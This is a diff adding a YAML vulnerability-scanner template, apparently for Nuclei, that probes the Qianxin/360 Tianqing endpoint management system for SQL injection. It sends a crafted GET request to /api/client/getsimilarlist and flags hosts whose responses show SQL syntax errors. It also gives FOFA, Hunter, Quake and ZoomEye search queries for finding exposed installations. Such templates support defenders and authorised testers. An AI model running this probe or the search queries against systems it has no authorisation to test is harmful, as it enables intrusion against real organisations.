@@ -1,0 +1,27 @@
+id: qianxin-tianqing-getsimilarlist-sqli
+info:
+  name: 360 奇安信天擎 getsimilarlist - sqli
+  author: leadlife
+  severity: high
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-360tianqing-getsimilarlist-sqli.yml
+  metadata:
+    verified: true
+    fofa-query: app="奇安信-天擎"
+    hunter-query: app.name="天擎终端安全管理系统"
+    quake-query: app:"奇安信天擎终端安全管理系统"
+    zoomeye-query: app:"Tianqing terminal management"
+  tags: 360,tianqing,sqli,qianxin
+
+http:
+  - raw:
+      - |
+        GET /api/client/getsimilarlist?status[0,1%29]=1&status[0]=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Syntax error','where')
+        condition: and
